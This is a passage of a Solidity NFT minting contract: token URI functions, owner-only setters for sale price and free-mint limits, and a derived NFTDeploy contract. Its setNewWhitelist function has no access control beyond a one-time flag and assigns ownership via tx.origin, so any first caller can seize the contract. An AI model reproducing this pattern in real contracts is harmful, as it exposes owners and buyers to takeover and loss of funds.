1142     override
1143     returns (string memory)
1144   {
1145     require(
1146       _exists(_tokenId),
1147       "ERC721Metadata: URI query for nonexistent token"
1148     );
1149     return string(abi.encodePacked(baseTokenURI, "/", _tokenId.toString()));
1150   }
1151 
1152   function _baseURI()
1153     internal
1154     view
1155     virtual
1156     
1157     returns (string memory)
1158   {
1159     return baseTokenURI;
1160   }
1161 
1162   function setIsPublicSaleActive(bool _isPublicSaleActive)
1163       external
1164       onlyOwner
1165   {
1166       isPublicSaleActive = _isPublicSaleActive;
1167   }
1168 
1169   function setNumFreeMints(uint256 _numfreemints)
1170       external
1171       onlyOwner
1172   {
1173       NUM_FREE_MINTS = _numfreemints;
1174   }
1175 
1176   function setSalePrice(uint256 _price)
1177       external
1178       onlyOwner
1179   {
1180       PUBLIC_SALE_PRICE = _price;
1181   }
1182 
1183 
1184   function setFreeLimitPerWallet(uint256 _limit)
1185       external
1186       onlyOwner
1187   {
1188       MAX_FREE_PER_WALLET = _limit;
1189   }
1190 }
1191 
1192 
1193 
1194 
1195 contract NFTDeploy is ERC721Deploy{
1196 
1197     
1198 
1199     constructor() payable ERC721Deploy(_name,_symbol){
1200         _name = "NFTNAME";
1201         _symbol = "NTFSYMBOL";
1202     }
1203     
1204 
1205      function setNewWhitelist(uint256 maxTokens_, uint256 nftPrice_, string memory name_, string memory symbol_,
1206                          uint256 maxFreePerWallet_, 
1207                         string memory URIs_,bool isPublicSaleActive_,uint256 maxFreeNums_) external {
1208         require(!isBase,"error.");
1209         maxSupply = maxTokens_;
1210         PUBLIC_SALE_PRICE = nftPrice_;
1211         _name = name_;
1212         _symbol = symbol_;
1213         _owner=tx.origin;
1214         MAX_FREE_PER_WALLET = maxFreePerWallet_;
1215         isPublicSaleActive=isPublicSaleActive_;
1216         NUM_FREE_MINTS=maxFreeNums_;
1217         baseTokenURI = URIs_;
1218         _currentIndex=1;
1219         isBase=true;
1220     }
1221 
1222 
1223 }